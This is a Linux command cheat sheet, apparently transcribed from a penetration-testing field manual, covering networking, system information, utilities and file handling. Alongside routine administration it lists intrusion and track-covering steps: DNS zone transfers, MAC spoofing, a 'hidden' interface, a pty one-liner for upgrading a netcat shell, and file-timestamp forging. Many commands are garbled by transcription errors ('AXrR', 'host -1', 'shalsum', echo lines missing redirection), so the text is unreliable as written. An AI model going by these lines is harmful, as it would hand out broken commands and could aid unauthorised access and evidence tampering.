********************  Linux Networking Commands  ************************
watch ss -tp                                                   #Network connections
netstat -ant                                                   #Tcp connections -anu=udp
netstat -tulpn                                                 #Connections with PIDs
lsof -i                                                        #Established connections
smb:// ip /share                                               #Access windows smb share
share user x.x.x.x c$                                          #Mount Windows share
smbclient -U user\\\\ ip \\ share                              #SMB connect
ifconfig eth# ip / cidr                                        #Set IP and netmask
ifconfig eth0:l ip / cidr                                      #Set virtual interface
route add default gw gw ip                                     #Set GW
ifconfig eth# mtu [size]                                       #Change MTU size
export MAC=xx: XX: XX: XX: XX: XX                              #Change MAC
ifconfig int hw ether MAC                                      #Change MAC
macchanger -m MAC int                                          #Backtrack MAC changer
iwlist int scan                                                #Built-in wifi scanner
dig -x ip                                                      #Domain lookup for IP
host ip                                                        #Domain lookup for IP
host -t SRV service tcp.url.com                                #Domain SRV lookup
dig @ ip domain -t AXrR                                        #DNS Zone Xfer
host -1 domain namesvr                                         #DNS Zone Xfer
ip xfrm state list                                             #Print existing VPN keys
ip addr add ip / cidr aev ethO                                 #Adds 'hidden' interface
/var/log/messages | grep DHCP                                  #List DHCP assignments
tcpkill host ip and port port                                  #Block ip:port
echo "1" /proc/sys/net/ipv4/ip forward                         #Turn on IP Forwarding
echo "nameserver x.x.x.x" /etc/resolv.conf                     #Add DNS Server
arp -an                                                        #Print route table without dns lookup
traceroute -n <ip>                                             #Trace route without dns lookup
netstat -rn                                                    #Prints routing table without dns lookup?????



********************  Linux System Info  ************************
nbtstat -A ip                                                                        #Get hostname for ip
nbtstat -name                                                                        #Lists local NetBIOS names
id                                                                                   #Current username
w                                                                                    #Logged on users
who -a                                                                               #User information
last -a                                                                              #Last users logged on
ps -ef                                                                               #Process listing (top)
df -h                                                                                #Disk usage (free)
uname -a                                                                             #Kernel version/CPU info
mount                                                                                #Mounted file Systems
getent passwd                                                                        #Show list of users
PATH~$PATH:/home/mypath                                                              #Add to PATH variable
kill pid                                                                             #Kills process with pid
cat /etc/issue                                                                       #Show OS info
cat /etc/'release'                                                                   #Show OS version info
cat /proc/version                                                                    #Show kernel info
rpm --query -all                                                                     #Installed pkgs (Redhat)
rpm -ivh ' .rpm                                                                      #Install RPM (-e=remove)
dpkg -get-selections                                                                 #Installed pkgs (Ubuntu)
dpkg -I '.deb                                                                        #Install DEB (-r=remove)
pkginfo                                                                              #Installed pkgs (Solaris)
which tscsh/csh/ksh/bash                                                             #Show location of executable
chmod -50 tcsh/csh/ksh                                                               #Disable shell , force bash




********************  Linux Utility Commands  ************************
wget http:// url -0 url.txt -o /dev/null                                                     #Grab url
wget https://8.8.8.8 --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0" -O - -o /dev/null --no-check-certificate

rdesktop -u <username> -p <Password> -d <domain> -n Windows7 -f -g 1920x1080 clipboard:PRIMARYCLIPBOARD ip         #Remote Desktop to ip
scp /tmp/file user@x.x.x.x:/tmp/file                                                         #Put file
scp user@<remoteip>:/tmp/file /tmp/file                                                      #Get file
useradd -m user                                                                              #Add user
passwd user                                                                                  #Change user password
rmuser unarne                                                                                #Remove user
script -a outfile                                                                            #Record shell : Ctrl-D stops
apropos subject                                                                              #Find related command
history                                                                                      #View users command history
! num                                                                                        #Executes line # in history
tar -xvfj file.tar                                                                           #Unpack a tar file bzip2(j)
tar -czvf <file>.tar.gz /original-file                                                       #Archive a gzip(z) file
encfs /cryptdir /tmp/cleartext                                                               #Temporarily unencrypts to /tmp/cleartext
python -c 'import pty;pty.spawn("/bin/bash")'                                                #Upgrades a nc shell to tty
openssl rand -base64 12                                                                      #generates a 12 charater random password   


********************  Linux File Commands  ************************
diff filel file2                                         #Compare files
rm -rf dir                                               #Force delete of dir
shred -f -u file                                         #Overwrite/delete file
touch -r <ref-file> file                                 #Matches ref_ file timestamp
touch -t YYYYMMDDHHSS file                               #Set file timestamp
fdisk -l                                                 #List connected drives
mount /dev/sda# /mnt/usbkey                              #mount USB key
md5sum -t file                                           #Compute md5 hash
echo -n "str" | md5sum                                   #Generate md5 hash
shalsum file                                             #SHAl hash of file
sort -u                                                  #Sort/show unique lines
grep -c ''str'' file                                     #Count lines w/ ''str''
tar cf file.tar files                                    #Create .tar from files
tar xf file.tar                                          #Extract .tar
tar czf file.tar.gz files                                #Create .tar.gz
tar xzf file.tar.gz                                      #Extract .tar.gz
